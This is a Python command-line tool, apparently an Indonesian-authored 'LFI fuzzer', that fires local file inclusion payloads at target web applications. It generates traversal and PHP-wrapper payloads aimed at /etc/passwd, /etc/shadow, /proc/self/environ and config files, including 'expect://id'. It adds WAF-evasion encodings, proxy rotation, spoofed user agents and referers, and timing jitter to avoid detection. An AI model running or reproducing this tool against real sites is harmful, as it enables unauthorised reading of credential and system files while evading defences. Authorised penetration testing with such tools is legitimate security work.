from colorama import init, Fore, Style

# Inisialisasi colorama agar ANSI escape code bekerja di Windows
init(autoreset=True)

header = f"""
{Fore.BLUE}
 ____   ___   ___  
|  _ \\ |_ _| / _ \\ 
| |_) | | | | | | |
|  _ <  | | | |_| |
|_| \\_\\|___| \\___/  
-----------------------------------------------------------
    LFI FUZZER
Developer: SatrioUN
Instagram: @rioocns
-----------------------------------------------------------
Gunakan alat ini dengan bijak!! Developer tidak bertanggung
jawab apabila terjadi hal yang tidak diinginkan akibat
penggunaan alat ini.
-----------------------------------------------------------
{Style.RESET_ALL}
"""

print(header)


import asyncio
import aiohttp
import logging
import re
import json
import csv
from datetime import datetime
from typing import List, Dict, Optional, Union
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics.pairwise import cosine_similarity
import argparse
import random
import time

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

PROXY_BLACKLIST_TIMEOUT = 300  # seconds

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.yahoo.com/",
    "https://www.facebook.com/",
]

def random_case(s: str) -> str:
    return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in s)

def whitespace_injection(s: str) -> str:
    # Sisipkan spasi URL encoded (%20) secara acak di antara karakter
    parts = list(s)
    for i in range(len(parts)-1, 0, -1):
        if random.choice([True, False]):
            parts.insert(i, "%20")
    return ''.join(parts)

def double_url_encode(s: str) -> str:
    return quote(quote(s))

def generate_evasion_payloads(payload: str) -> List[str]:
    evasion_payloads = []
    evasion_payloads.append(payload)  # original
    evasion_payloads.append(random_case(payload))
    evasion_payloads.append(whitespace_injection(payload))
    evasion_payloads.append(double_url_encode(payload))
    evasion_payloads.append(payload + "%00")  # null byte
    evasion_payloads.append(payload + "%2500")  # double encoded null byte
    return list(set(evasion_payloads))

def get_advanced_payloads() -> List[str]:
    base_payloads = [
        "../../../../../../../../etc/passwd",
        "../../../../../../../../etc/hosts",
        "../../../../../../../../proc/self/environ",
        "../../../../../../../../etc/shadow",
        "../../../../../../../../var/log/apache2/access.log",
        "../../../../../../../../var/log/apache2/error.log",
        # Exploitasi lanjutan
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://input",
        "expect://id",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=config.php",
    ]
    advanced_payloads = []

    traversal_variants = [
        "..%2f" * 8,
        "..%252f" * 8,
        "....//" * 4,
        "..\\..\\..\\..\\..\\..\\..\\..\\",
        "..%5c" * 8,
    ]

    wrappers = [
        "php://filter/convert.base64-encode/resource=",
        "php://input",
        "php://memory",
        "php://temp",
        "expect://id",
    ]

    for base in base_payloads:
        advanced_payloads.append(base)
        for w in wrappers:
            advanced_payloads.append(w + base)
        for t in traversal_variants:
            advanced_payloads.append(t + base)

    null_byte_variants = []
    for p in base_payloads:
        null_byte_variants.append(p + "%00")
        null_byte_variants.append(p + "%2500")

    advanced_payloads.extend(null_byte_variants)

    def mixed_case(s):
        return ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))

    for p in base_payloads:
        advanced_payloads.append(quote(quote(p)))  # double URL encode
        advanced_payloads.append(mixed_case(p))

    # Tambahkan evasion payloads
    final_payloads = []
    for p in set(advanced_payloads):
        final_payloads.extend(generate_evasion_payloads(p))

    return list(set(final_payloads))

class ProxyRotator:
    def __init__(self, proxies: List[str]):
        self.proxies = proxies
        self.failed = {}
        self.index = 0
        self.validated_proxies = []

    async def async_init(self):
        async def test_proxy(proxy_url):
            try:
                connector = aiohttp.TCPConnector(ssl=False)
                timeout = aiohttp.ClientTimeout(total=5)
                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    async with session.get("http://httpbin.org/ip", proxy=proxy_url) as resp:
                        if resp.status == 200:
                            logger.info(f"Proxy validated: {proxy_url}")
                            return proxy_url
            except Exception:
                return None

        validated = []
        for p in self.proxies:
            proxy_url = p if p.startswith(('http://', 'https://')) else f"http://{p}"
            valid = await test_proxy(proxy_url)
            if valid:
                validated.append(valid)
            else:
                logger.warning(f"Proxy {proxy_url} failed validation and skipped.")
        self.validated_proxies = validated
        if not validated:
            logger.warning("No valid proxies available after validation.")

    def get_proxy(self) -> Optional[Dict[str, str]]:
        if not self.validated_proxies:
            return None
        start_index = self.index
        now = datetime.now().timestamp()
        while True:
            proxy = self.validated_proxies[self.index]
            self.index = (self.index + 1) % len(self.validated_proxies)
            if proxy in self.failed and now - self.failed[proxy] < PROXY_BLACKLIST_TIMEOUT:
                if self.index == start_index:
                    logger.warning("All proxies blacklisted, no proxy used.")
                    return None
                continue
            return {"http": proxy, "https": proxy}

    def mark_failed(self, proxy: Union[str, Dict[str, str]]) -> None:
        proxy_url = proxy if isinstance(proxy, str) else proxy.get('http', proxy.get('https', ''))
        self.failed[proxy_url] = datetime.now().timestamp()
        logger.debug(f"Proxy {proxy_url} blacklisted for {PROXY_BLACKLIST_TIMEOUT}s.")

class FalsePositiveDetector:
    def __init__(self, threshold=0.85):
        self.threshold = threshold
        self.vectorizer = TfidfVectorizer()

    def is_false_positive(self, response_text: str, baseline_text: str) -> bool:
        try:
            vectors = self.vectorizer.fit_transform([response_text, baseline_text])
            similarity = cosine_similarity(vectors[0], vectors[1])[0][0]

            len_resp = len(response_text)
            len_base = len(baseline_text)
            length_diff_ratio = abs(len_resp - len_base) / max(len_base, 1)

            tags_resp = len(re.findall(r'<[^>]+>', response_text))
            tags_base = len(re.findall(r'<[^>]+>', baseline_text))
            tag_diff_ratio = abs(tags_resp - tags_base) / max(tags_base, 1)

            logger.debug(f"Cosine similarity: {similarity:.4f}, Length diff ratio: {length_diff_ratio:.4f}, Tag diff ratio: {tag_diff_ratio:.4f}")

            if similarity > self.threshold and length_diff_ratio < 0.1 and tag_diff_ratio < 0.1:
                return True
            return False
        except Exception as e:
            logger.debug(f"False positive detection error: {e}")
            return False

def generate_html_report(results: List[Dict], output_file: str) -> None:
    total = len(results)
    true_positives = sum(1 for r in results if r["lfi_signature"] and not r["is_false_positive"])
    false_positives = sum(1 for r in results if r["lfi_signature"] and r["is_false_positive"])
    no_lfi = total - true_positives - false_positives

    html_header = f"""
    <html><head><title>LFI Scan Report</title>
    <style>
    body {{ font-family: Arial, sans-serif; }}
    table {{ border-collapse: collapse; width: 100%; }}
    th, td {{ border: 1px solid #ddd; padding: 8px; }}
    th {{ background-color: #4CAF50; color: white; }}
    tr:nth-child(even) {{ background-color: #f2f2f2; }}
    .true-positive {{ color: red; font-weight: bold; }}
    .false-positive {{ color: orange; font-weight: bold; }}
    .no-lfi {{ color: green; }}
    #filterInput {{ margin-bottom: 10px; padding: 5px; width: 300px; }}
    </style>
    <script>
    function filterTable() {{
        var input, filter, table, tr, td, i, j, txtValue, show;
        input = document.getElementById("filterInput");
        filter = input.value.toUpperCase();
        table = document.getElementById("resultsTable");
        tr = table.getElementsByTagName("tr");
        for (i = 1; i < tr.length; i++) {{
            tr[i].style.display = "none";
            td = tr[i].getElementsByTagName("td");
            show = false;
            for (j = 0; j < td.length; j++) {{
                if (td[j]) {{
                    txtValue = td[j].textContent || td[j].innerText;
                    if (txtValue.toUpperCase().indexOf(filter) > -1) {{
                        show = true;
                        break;
                    }}
                }}
            }}
            if (show) {{
                tr[i].style.display = "";
            }}
        }}
    }}
    </script>
    </head><body>
    <h1>LFI Scan Report</h1>
    <p>Total tests: {total} | True Positives: {true_positives} | False Positives: {false_positives} | No LFI: {no_lfi}</p>
    <input type="text" id="filterInput" onkeyup="filterTable()" placeholder="Filter results...">
    <table id="resultsTable">
    <tr>
        <th>Target URL</th>
        <th>Tested URL</th>
        <th>Parameter</th>
        <th>Payload</th>
        <th>Status Code</th>
        <th>Response Length</th>
        <th>LFI Signature</th>
        <th>False Positive</th>
        <th>Proxy</th>
        <th>Timestamp</th>
        <th>Method</th>
        <th>Injection Point</th>
    </tr>
    """
    html_footer = "</table></body></html>"

    rows = []
    for r in results:
        fp_class = "no-lfi"
        fp_text = "N/A"
        if r["lfi_signature"]:
            if r["is_false_positive"]:
                fp_class = "false-positive"
                fp_text = "Yes"
            else:
                fp_class = "true-positive"
                fp_text = "No"
        row = f"""
        <tr class="{fp_class}">
            <td>{r.get("target_url")}</td>
            <td>{r.get("url")}</td>
            <td>{r.get("param")}</td>
            <td>{r.get("payload")}</td>
            <td>{r.get("status_code")}</td>
            <td>{r.get("response_length")}</td>
            <td>{r.get("lfi_signature") or "-"}</td>
            <td>{fp_text}</td>
            <td>{r.get("proxy") or "-"}</td>
            <td>{r.get("timestamp")}</td>
            <td>{r.get("method")}</td>
            <td>{r.get("injection_point")}</td>
        </tr>
        """
        rows.append(row)

    html_content = html_header + "\n".join(rows) + html_footer
    try:
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(html_content)
        logger.info(f"HTML report generated: {output_file}")
    except Exception as e:
        logger.error(f"Failed to write HTML report: {e}")

def export_results_csv(results: List[Dict], filename: str) -> None:
    keys = ["target_url", "url", "param", "payload", "status_code", "response_length", "lfi_signature", "is_false_positive", "proxy", "timestamp", "method", "injection_point"]
    try:
        with open(filename, "w", newline='', encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=keys)
            writer.writeheader()
            for r in results:
                writer.writerow({k: r.get(k) for k in keys})
        logger.info(f"CSV report generated: {filename}")
    except Exception as e:
        logger.error(f"Failed to write CSV report: {e}")

def export_results_json(results: List[Dict], filename: str) -> None:
    try:
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2)
        logger.info(f"JSON report generated: {filename}")
    except Exception as e:
        logger.error(f"Failed to write JSON report: {e}")

def load_list_from_file(filename: str) -> List[str]:
    try:
        with open(filename, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        logger.error(f"Failed to load file {filename}: {e}")
        return []

async def scan_url(session: aiohttp.ClientSession, url: str, param: str, payload: str, baseline_text: str, fp_detector: FalsePositiveDetector, proxy: Optional[Dict[str, str]] = None, method: str = "GET", inject_in: str = "param") -> Dict:
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(REFERERS),
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close",
    }
    cookies = {}

    # Random delay 100-500 ms untuk menghindari pola request cepat
    await asyncio.sleep(random.uniform(0.1, 0.5))

    if method.upper() == "GET":
        if inject_in == "param":
            query[param] = payload
        new_query = urlencode(query, doseq=True)
        new_url = urlunparse(parsed._replace(query=new_query))
        data = None
    elif method.upper() == "POST":
        new_url = urlunparse(parsed._replace(query=""))
        if inject_in == "param":
            data = {param: payload}
        else:
            data = {}
    else:
        new_url = url
        data = None

    if inject_in == "header":
        headers[param] = payload
    if inject_in == "cookie":
        cookies[param] = payload

    try:
        if method.upper() == "GET":
            async with session.get(new_url, headers=headers, cookies=cookies, proxy=proxy.get("http") if proxy else None, ssl=False) as resp:
                text = await resp.text(errors='ignore')
                status = resp.status
        elif method.upper() == "POST":
            async with session.post(new_url, data=data, headers=headers, cookies=cookies, proxy=proxy.get("http") if proxy else None, ssl=False) as resp:
                text = await resp.text(errors='ignore')
                status = resp.status
        else:
            async with session.get(new_url, headers=headers, cookies=cookies, proxy=proxy.get("http") if proxy else None, ssl=False) as resp:
                text = await resp.text(errors='ignore')
                status = resp.status

        length = len(text)

        lfi_signatures = [
            "root:x:0:0:",
            "syntax error", "failed to open stream", "include_path", "Warning:", "Fatal error",
            "No such file or directory", "Permission denied"
        ]
        lfi_sig = None
        for sig in lfi_signatures:
            if sig.lower() in text.lower():
                lfi_sig = sig
                break

        is_fp = False
        if lfi_sig:
            is_fp = fp_detector.is_false_positive(text, baseline_text)

        result = {
            "target_url": url,
            "url": new_url,
            "param": param,
            "payload": payload,
            "status_code": status,
            "response_length": length,
            "lfi_signature": lfi_sig,
            "is_false_positive": is_fp,
            "proxy": proxy.get("http") if proxy else None,
            "timestamp": datetime.now().isoformat(),
            "method": method,
            "injection_point": inject_in
        }
        return result
    except Exception as e:
               logger.error(f"Request error for {url} with payload {payload}: {e}")
               return {
            "target_url": url,
            "url": url,
            "param": param,
            "payload": payload,
            "status_code": None,
            "response_length": 0,
            "lfi_signature": None,
            "is_false_positive": False,
            "proxy": proxy.get("http") if proxy else None,
            "timestamp": datetime.now().isoformat(),
            "method": method,
            "injection_point": inject_in
        }

async def fetch_baseline(session: aiohttp.ClientSession, url: str, proxy: Optional[Dict[str, str]] = None) -> str:
    try:
        async with session.get(url, proxy=proxy.get("http") if proxy else None, ssl=False) as resp:
            text = await resp.text(errors='ignore')
            return text
    except Exception as e:
        logger.error(f"Failed to fetch baseline for {url}: {e}")
        return ""

async def run_scan(
    urls: List[str],
    payloads: List[str],
    concurrency: int = 10,
    proxy_list: Optional[List[str]] = None,
    output_html: Optional[str] = None,
    output_csv: Optional[str] = None,
    output_json: Optional[str] = None,
    methods: List[str] = ["GET"],
    injection_points: List[str] = ["param"],
) -> List[Dict]:
    connector = aiohttp.TCPConnector(limit_per_host=concurrency, ssl=False)
    timeout = aiohttp.ClientTimeout(total=30)
    fp_detector = FalsePositiveDetector()

    proxy_rotator = None
    if proxy_list:
        proxy_rotator = ProxyRotator(proxy_list)
        await proxy_rotator.async_init()

    results = []

    semaphore = asyncio.Semaphore(concurrency)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:

        async def bound_scan(url, param, payload, method, inject_in):
            async with semaphore:
                proxy = proxy_rotator.get_proxy() if proxy_rotator else None
                baseline_text = await fetch_baseline(session, url, proxy)
                result = await scan_url(session, url, param, payload, baseline_text, fp_detector, proxy, method, inject_in)
                if proxy_rotator and proxy and result["status_code"] in [403, 429, 502, 503, 504]:
                    proxy_rotator.mark_failed(proxy)
                results.append(result)

        tasks = []
        for url in urls:
            parsed = urlparse(url)
            query_params = list(parse_qs(parsed.query).keys())
            if not query_params:
                # Jika tidak ada param, gunakan dummy param 'file'
                query_params = ["file"]
            for param in query_params:
                for payload in payloads:
                    for method in methods:
                        for inject_in in injection_points:
                            tasks.append(bound_scan(url, param, payload, method, inject_in))

        await asyncio.gather(*tasks)

    # Filter hanya true positive (ada lfi_signature dan bukan false positive)
    true_positive_results = [r for r in results if r["lfi_signature"] and not r["is_false_positive"]]

    if output_html:
        generate_html_report(true_positive_results, output_html)
    if output_csv:
        export_results_csv(true_positive_results, output_csv)
    if output_json:
        export_results_json(true_positive_results, output_json)

    return true_positive_results

def main():
    parser = argparse.ArgumentParser(description="LFI Fuzzer")
    parser.add_argument("-u", "--url", help="Target URL (single)")
    parser.add_argument("-U", "--url-list", help="File with list of URLs")
    parser.add_argument("-p", "--payload-list", help="File with list of payloads")
    parser.add_argument("-P", "--proxy-list", help="File with list of proxies")
    parser.add_argument("-c", "--concurrency", type=int, default=10, help="Number of concurrent requests")
    parser.add_argument("--output-html", help="Output HTML report file")
    parser.add_argument("--output-csv", help="Output CSV report file")
    parser.add_argument("--output-json", help="Output JSON report file")
    parser.add_argument("-m", "--methods", nargs="+", default=["GET"], help="HTTP methods to use (GET, POST)")
    parser.add_argument("-i", "--injection-points", nargs="+", default=["param"], help="Injection points (param, header, cookie)")

    args = parser.parse_args()

    urls = []
    if args.url:
        urls.append(args.url)
    if args.url_list:
        urls.extend(load_list_from_file(args.url_list))
    if not urls:
        logger.error("No target URLs provided. Use -u or -U.")
        return

    if args.payload_list:
        payloads = load_list_from_file(args.payload_list)
    else:
        payloads = get_advanced_payloads()

    proxies = []
    if args.proxy_list:
        proxies = load_list_from_file(args.proxy_list)

    methods = [m.upper() for m in args.methods]
    injection_points = [i.lower() for i in args.injection_points]

    results = asyncio.run(
        run_scan(
            urls=urls,
            payloads=payloads,
            concurrency=args.concurrency,
            proxy_list=proxies if proxies else None,
            output_html=args.output_html,
            output_csv=args.output_csv,
            output_json=args.output_json,
            methods=methods,
            injection_points=injection_points,
        )
    )

    # Tampilkan hanya URL yang valid (true positive)
    if results:
        print("\nValid LFI Vulnerabilities Found:")
        for res in results:
            print(f"- {res['url']} (Param: {res['param']}, Payload: {res['payload']})")
    else:
        print("\nNo valid LFI vulnerabilities found.")

    logger.info(f"Scan completed. Total tests: {len(results)}. Valid findings: {len(results)}")

if __name__ == "__main__":
    main()
